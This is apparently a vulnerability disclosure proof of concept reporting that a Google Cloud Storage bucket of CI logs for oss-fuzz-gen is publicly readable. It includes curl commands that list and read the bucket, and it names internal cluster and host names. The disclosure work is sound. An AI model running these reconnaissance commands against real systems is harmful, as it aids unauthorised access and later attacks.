# PoC: Public GCS Bucket Exposure in google/oss-fuzz-gen

Google VRP authorized security research.

## Vulnerability

The GCS bucket `gs://oss-fuzz-gen-ci-logs` is publicly listable and readable
without any authentication. This bucket is referenced in google/oss-fuzz-gen's
`ci/cloudbuild.yaml` as the `logsBucket` for Cloud Build runs.

## Exposed Data

- GKE cluster names and locations (`llm-experiment`, `us-central1-c`)
- GCS bucket paths for experiment results
- PR numbers, experiment names, and configurations
- Internal infrastructure URLs (`llm-exp.oss-fuzz.com`)
- Cloud Build worker pool names
- kubectl output showing job creation/deletion

## Reproduction

Run the workflow or execute locally:

```bash
# List bucket contents (no auth required)
curl -s "https://storage.googleapis.com/oss-fuzz-gen-ci-logs/" | head

# Read a specific log file
curl -s "https://storage.googleapis.com/oss-fuzz-gen-ci-logs/log-3de186db-fbcd-4ca9-aed1-9555eaee6db4-step-3.txt"
```

## Impact

While no direct credentials were found in sampled logs, the exposed
infrastructure details aid exploitation of other vulnerabilities by
providing exact cluster names, bucket paths, and naming patterns.

Logs have been accumulating since 2024-05-03 and the bucket is still
publicly accessible.
